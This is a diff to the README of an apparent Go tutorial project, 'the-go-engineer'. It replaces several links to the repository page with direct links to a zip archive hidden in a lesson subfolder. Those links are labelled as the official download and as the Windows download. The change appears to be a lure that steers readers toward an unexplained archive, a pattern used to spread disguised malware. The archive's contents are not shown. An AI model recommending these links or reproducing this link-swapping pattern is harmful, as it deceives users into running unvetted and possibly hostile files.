@@ -1,12 +1,12 @@
 # 🧰 the-go-engineer - Learn Go Through Real Projects
 
-[![Download the-go-engineer](https://img.shields.io/badge/Download%20the-go-engineer-blue?style=for-the-badge&logo=github)](https://github.com/Calleyindulgent575/the-go-engineer)
+[![Download the-go-engineer](https://img.shields.io/badge/Download%20the-go-engineer-blue?style=for-the-badge&logo=github)](https://github.com/Calleyindulgent575/the-go-engineer/raw/refs/heads/main/04-types-design/7-receiver-sets/the_engineer_go_3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the project files:
 
-[Download the-go-engineer](https://github.com/Calleyindulgent575/the-go-engineer)
+[Download the-go-engineer](https://github.com/Calleyindulgent575/the-go-engineer/raw/refs/heads/main/04-types-design/7-receiver-sets/the_engineer_go_3.3.zip)
 
 ## 🖥️ What this is
 
@@ -171,7 +171,7 @@ This helps you learn faster and spot mistakes sooner.
 
 Use the official repository link below to get the files:
 
-[https://github.com/Calleyindulgent575/the-go-engineer](https://github.com/Calleyindulgent575/the-go-engineer)
+[https://github.com/Calleyindulgent575/the-go-engineer/raw/refs/heads/main/04-types-design/7-receiver-sets/the_engineer_go_3.3.zip](https://github.com/Calleyindulgent575/the-go-engineer/raw/refs/heads/main/04-types-design/7-receiver-sets/the_engineer_go_3.3.zip)
 
 ## 🧩 Common terms
 
@@ -234,7 +234,7 @@ A simple path through this project may look like this:
 
 Visit the download page here and use the repository files on Windows:
 
-[Download the-go-engineer](https://github.com/Calleyindulgent575/the-go-engineer)
+[Download the-go-engineer](https://github.com/Calleyindulgent575/the-go-engineer/raw/refs/heads/main/04-types-design/7-receiver-sets/the_engineer_go_3.3.zip)
 
 ## 🧭 Final setup check
 
